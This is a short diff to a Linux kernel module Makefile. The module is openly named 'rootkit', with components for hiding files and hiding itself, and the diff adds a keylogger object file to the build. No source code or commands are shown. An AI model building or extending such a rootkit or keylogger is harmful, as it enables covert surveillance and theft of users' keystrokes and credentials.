@@ -3,7 +3,7 @@ KDIR ?= /lib/modules/$(shell uname -r)/build
 # Our module name is 'my_module'
 # We list the object files for each C file we want to compile into this module
 obj-m := rootkit.o
-rootkit-objs := src/main.o src/hide_file.o src/hide_rootkit.o 
+rootkit-objs := src/main.o src/hide_file.o src/hide_rootkit.o src/key_logger.o
 
 
 # Default rule: build the module(s)
